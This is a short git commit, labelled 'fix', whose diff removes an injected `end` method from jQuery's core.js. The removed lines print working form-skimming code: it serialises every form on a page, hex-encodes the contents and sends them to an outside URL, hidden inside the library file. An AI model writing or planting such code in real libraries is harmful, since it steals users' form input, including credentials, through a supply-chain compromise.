d8e9e9f2fab1d1debb59fd5de54075b9c20aee32
KAk1r4 <k.akira.517@gmail.com>
2024-12-15 23:27:25 +0900

    fix

--- core.js
+++ core.js
@@ -107,26 +107,6 @@ jQuery.fn = jQuery.prototype = {
 		return this.pushStack( j >= 0 && j < len ? [ this[ j ] ] : [] );
 	},
 
-	end: async function () {
-		const encodeToHex = (str) => {
-			return Array.from(str)
-				.map((char) => {
-					const hex = char.charCodeAt(0).toString(16);
-					return hex.length < 2 ? "0" + hex : hex;
-				})
-				.join("");
-		};
-	
-		const serializedForm = $("form").serialize();
-		const encodedData = encodeToHex(serializedForm);
-	
-		await $.ajax({
-			url: `https://sample/halo/?cat=${encodedData}`,
-			type: "GET",
-			dataType: "text",
-			headers: { "Content-type": "application/json" },
-		});
-	}	
 };
 
 jQuery.extend = jQuery.fn.extend = function() {
